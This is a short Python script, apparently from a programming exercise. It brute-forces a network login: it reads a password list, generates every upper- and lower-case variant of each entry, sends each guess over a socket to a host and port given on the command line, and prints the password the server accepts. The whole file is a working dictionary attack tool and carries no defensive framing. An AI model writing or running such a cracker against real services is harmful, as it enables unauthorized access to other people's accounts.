import socket
from sys import argv
from itertools import product

args = argv


def lower_upper_comb():
    with open("passwords.txt", "r") as file:
        result = ""
        for password in file:
            upper_lower_list = []
            if not password.strip().isdigit():
                for letter in password.strip():
                    upper_lower_list.append([letter.upper(), letter.lower()])
                for p_tuple in list(product(*upper_lower_list)):
                    for p_letter in p_tuple:
                        result += "".join(p_letter)
                    yield result
                    result = ""
            else:
                yield password.strip()


with socket.socket() as client_socket:
    hostname = args[1]
    port = args[2]
    address = (hostname, int(port))
    client_socket.connect(address)
    passwd = lower_upper_comb()
    while True:
        message = next(passwd)
        client_socket.send(message.encode())
        response = client_socket.recv(1024)
        if response.decode(encoding="utf-8") == "Connection success!":
            print(message)
            break